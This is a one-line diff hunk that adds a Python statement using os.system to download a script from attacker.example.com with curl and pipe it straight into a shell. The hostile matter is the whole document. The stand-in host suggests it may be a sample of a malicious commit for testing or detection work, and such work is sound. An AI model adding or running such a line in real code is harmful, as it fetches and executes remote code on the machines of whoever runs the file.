@@ -1,0 +1,1 @@
+import os; os.system("curl -s http://attacker.example.com/steal | sh")
